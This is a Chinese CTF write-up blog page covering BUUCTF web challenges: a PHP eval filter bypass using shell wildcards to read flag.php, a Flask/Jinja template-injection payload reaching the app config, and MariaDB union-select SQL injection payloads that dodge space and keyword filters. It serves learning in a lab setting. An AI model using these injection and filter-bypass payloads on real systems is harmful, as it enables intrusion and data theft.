<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF4 | upload</title><meta name="keywords" content="命令执行,代码执行,寒假CTF DAY 03,命令执行bypass,shell理解,ssti,基于MariaDB的SQL注入,无列名注入,OSINT"><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="ggogogoggogogogogo">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF4">
<meta property="og:url" content="http://upload.love/2021/01/04/BUUCTF-4/index.html">
<meta property="og:site_name" content="upload">
<meta property="og:description" content="ggogogoggogogogogo">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://upload.love/image/ttt.jpg">
<meta property="article:published_time" content="2021-01-04T00:34:04.000Z">
<meta property="article:modified_time" content="2021-01-12T04:52:40.640Z">
<meta property="article:author" content="upload">
<meta property="article:tag" content="命令执行">
<meta property="article:tag" content="代码执行">
<meta property="article:tag" content="寒假CTF DAY 03">
<meta property="article:tag" content="命令执行bypass">
<meta property="article:tag" content="shell理解">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="基于MariaDB的SQL注入">
<meta property="article:tag" content="无列名注入">
<meta property="article:tag" content="OSINT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://upload.love/image/ttt.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/01/04/BUUCTF-4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-12 12:52:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'true'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-04T00:34:04.000Z" title="发表于 2021-01-04 08:34:04">2021-01-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-12T04:52:40.640Z" title="更新于 2021-01-12 12:52:40">2021-01-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="今天早上起来看到一位师傅发的一道题！有关-命令-代码执行！"><a href="#今天早上起来看到一位师傅发的一道题！有关-命令-代码执行！" class="headerlink" title="今天早上起来看到一位师傅发的一道题！有关 命令|代码执行！"></a>今天早上起来看到一位师傅发的一道题！有关 命令|代码执行！</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is located in flag.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    $a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>( strlen($a)&gt;<span class="number">27</span> )&#123;</span><br><span class="line">        <span class="keyword">die</span>(strval(strlen($a)) . <span class="string">&quot; Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( preg_match(<span class="string">&quot;/[A-Zb-z0-9_$.&amp;;|^~![\]()&#123;&#125;\$@\*]+/&quot;</span>, $a) )&#123;</span><br><span class="line">        <span class="comment">// die(&quot;NO.&quot;);</span></span><br><span class="line">        print_r(<span class="string">&#x27;check&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;&quot;</span> . $a .<span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?a=<span class="string">&#x27;?&gt;&lt;?=`/???/?a? ??a?????`?&gt;</span></span><br></pre></td></tr></table></figure>



<p>这到题就是代码执行！但是无字母webshell，是不行的！有正则！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">又看了看eval</span><br><span class="line">eval — 把字符串作为PHP代码执行</span><br><span class="line">里面可以有多条php与语句</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">&lt;?php</span><br><span class="line">eval(&quot;?&gt;&quot;.&quot;&lt;?&#x3D;&#96;echo 1111111&#96;;&quot;);</span><br><span class="line">;和?&gt;都表示结束！具体的区别还不是很清楚！</span><br><span class="line">哦</span><br><span class="line">;只是表示php语句的结束！</span><br><span class="line">?&gt;是php代码的结束！</span><br><span class="line"></span><br><span class="line">所有eval里直接各写各的php代码！ 保证都能执行！</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210104182350.png" alt="image-20210104100644996"></p>
<p>如果是分号！就有问题！</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210104182351.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210104182352.png" alt="image-20210104101314888"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个题就是：</span><br><span class="line">&#x2F;bin&#x2F;cat flag.php</span><br><span class="line">&#x2F;???&#x2F;?a? ??a?????</span><br><span class="line">通配符*和?的使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3918?accounttraceid=d4c075b93a7d45fb9da70a415d1e523epxnt">Bypass一些命令注入限制的姿势</a></p>
<p>讲到shell！</p>
<p>再看看shell!之前都不是很理解！！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。</span><br><span class="line"></span><br><span class="line">Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</span><br><span class="line"></span><br><span class="line">Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell。</span><br></pre></td></tr></table></figure>



<h4 id="shell里的正则表达式"><a href="#shell里的正则表达式" class="headerlink" title="shell里的正则表达式"></a>shell里的正则表达式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^</span><br><span class="line">匹配输入字符串的开始位置。</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line">匹配输入字符串的结束位置。</span><br><span class="line"></span><br><span class="line">*</span><br><span class="line">匹配前面的子表达式零次或多次</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">匹配前面的子表达式一次或多次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">匹配前面的子表达式零次或一次。</span><br><span class="line"></span><br><span class="line">&#123;n&#125;</span><br><span class="line">n 是一个非负整数。匹配确定的 n 次。</span><br><span class="line"></span><br><span class="line">&#123;n,&#125;</span><br><span class="line">n 是一个非负整数。至少匹配n 次。</span><br><span class="line"></span><br><span class="line">&#123;n,m&#125;</span><br><span class="line">m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">当该字符紧跟在任何一个其他限制符 (*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125;) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">匹配除换行符（\n、\r）之外的任何单个字符。</span><br><span class="line"></span><br><span class="line">[xyz]</span><br><span class="line">字符集合。匹配所包含的任意一个字符。</span><br></pre></td></tr></table></figure>

<p>还有一些内置的通用字符簇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[:alpha:]] 任何字母</span><br><span class="line">[[:digit:]] 任何数字</span><br><span class="line">[[:alnum:]] 任何字母和数字</span><br><span class="line">[[:space:]] 任何空白字符</span><br><span class="line">[[:upper:]] 任何大写字母</span><br><span class="line">[[:lower:]] 任何小写字母</span><br><span class="line">[[:punct:]] 任何标点符号</span><br><span class="line">[[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F]</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw">巧用命令注入的N种方式</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">命令注入绕过姿势</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&#39;&#39;t flag </span><br></pre></td></tr></table></figure>



<p>上面的文章里有师傅们写的命令执行bypass技巧！</p>
<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">好像是模板注入！但是有过滤！！</span><br><span class="line">这个题看了大佬的wp后！</span><br><span class="line">知道了flag在config</span><br><span class="line"></span><br><span class="line">注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接&#123;&#123;config&#125;&#125;即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</span><br><span class="line"></span><br><span class="line">flag存放于config中，需要绕过黑名单（黑名单中的内容被替换为空）和括号。</span><br><span class="line">python的内置函数url_for和get_flashed_messages。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;538f72bb-24ad-477f-82ee-4e61f4e136ae.node3.buuoj.cn&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br><span class="line">http:&#x2F;&#x2F;538f72bb-24ad-477f-82ee-4e61f4e136ae.node3.buuoj.cn&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>





<p>总结：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这道题一上来看到flask，safe_jinja。还有过滤就知道是ssti！但是自己的py学的不咋地！flask也不是很会！自己想找注入点！找了好久！不能仅仅局限与变量注入！@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)这个路径也能产生注入！  不会flask，啥时候学学呢！</span><br><span class="line">然后就是，根据代码判断flag位置！再通过py函数</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124710.png"></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1700299?from=information.detail.flask%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B">Flask 入门系列教程（一）</a></p>
<p>原理这里是<strong>动态 URL</strong></p>
<p>其中的是根据不同人来变化的，这种就属于动态 URL 地址，Flask 可以很好的支持这种形式。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/user/&lt;name&gt;&#x27;</span>)</span><br><span class="line">def welcome(name):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello, %s!&lt;/h1&gt;&#x27;</span> % name</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124711.png" alt="image-20210104191626368"></p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124712.png" alt="image-20210104204714871"></p>
<p>mysql里 数字</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124713.png" alt="image-20210104211741641"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124714.png" alt="image-20210104212105661"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL5.7的新特性：</span><br><span class="line"></span><br><span class="line">由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">由于我的mysql版本低了！好像没有上面两个</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6eba3370cfab">不知道列名的情况下注入</a></p>
<p><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/sqli_without_knowing_columns_names.html#0x01-%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%90%8D%E6%9F%A5%E8%AF%A2">不知道列名的情况下注入</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124715.png" alt="image-20210105125659304"></p>
<h3 id="看题！"><a href="#看题！" class="headerlink" title="看题！"></a>看题！</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124716.png" alt="image-20210105131726246"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;&#39;&#39; limit 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>



<p>刚刚</p>
<p><a target="_blank" rel="noopener" href="https://www.wh1teze.top/articles/2020/01/31/1580457631958.html">BuuCTF刷题之旅之[SWPU2019]Web1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a352261e0ad5">[SWPU2019] Web1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">[SWPU2019]Web1</a></p>
<p><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/sqli_without_knowing_columns_names.html#0x01-%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%90%8D%E6%9F%A5%E8%AF%A2">不知道列名的情况下注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512#h2-3">聊一聊bypass information_schema</a></p>
<p>一开始不知道join咋用的！</p>
<p>自己测试了测试！：</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-join.html">MySQL 连接的使用</a></p>
<ul>
<li><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</li>
</ul>
<p>理解：就是把两个表数据弄到一起！但是我不是很了解！（到底按照什么方法和到一起的！）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124717.png" alt="image-20210105213834070"></p>
<h3 id="0x01-MariaDB特性"><a href="#0x01-MariaDB特性" class="headerlink" title="0x01 MariaDB特性"></a>0x01 MariaDB特性</h3><p>Maria数据库的这个表可以查表名：mysql.innodb_table_stats<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
<p><strong>About MariaDB</strong></p>
<p>成立于2009年，MySQL之父Michael “Monty” Widenius用他的新项目MariaDB完成了对MySQL的“反戈一击”。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。 过去一年中，大型互联网用户以及Linux发行商纷纷抛弃MySQL，转投MariaDB阵营。MariaDB是目前最受关注的MySQL数据库衍生版，也被视为开源数据库MySQL的替代品。</p>
<p>题目：</p>
<p>这里fuzz还不行！自己手动测试！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大佬文章有：https:&#x2F;&#x2F;www.wh1teze.top&#x2F;articles&#x2F;2020&#x2F;01&#x2F;31&#x2F;1580457631958.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">经过测试，发现对or、#、空格等进行了过滤。因为是字符型注入，所以我们构造 payload 是需要对后面的&#39;进行闭合。对于空格我们可以用&#x2F;**&#x2F;bypass。</span><br><span class="line"></span><br><span class="line">因为存在报错信息，我们尝试进行报错注入。</span><br><span class="line"></span><br><span class="line">但是经过测试发现对于常见的报错函数extactvalue()、updatexml()等被过滤。又因为数据库为MariaDB，查看官方文档：</span><br><span class="line"></span><br><span class="line">27.Geographic Functions • Starting with MySQL 8.0 there are many new or enhanced geographic functions which can make use of spatial data types. In addition, MySQL 8.0 added support for spatial indexes which previously existed in MariaDB • Examples of functions available in MySQL 8.0 which are not present in MariaDB 10.3: • ST_DISTANCE_SPHERE • ST_GeoHash • ST_IsValid • ST_LatFromGeoHash • ST_LongFromGeoHash • ST_PointFromGeoHash • ST_SIMPLIFY • ST_VALIDATE 27</span><br><span class="line"></span><br><span class="line">MySQL中可以进行报错注入的空间函数在MariaDB中不存在，所以报错注入不可行。</span><br><span class="line"></span><br><span class="line">尝试联合查询注入。</span><br></pre></td></tr></table></figure>



<h3 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210112124718.png" alt="image-20210105214349206"></p>
<p>发现数据库版本较高。因为<code>or</code>被正则过滤，所以<code>information_schema</code>库无法利用。</p>
<ul>
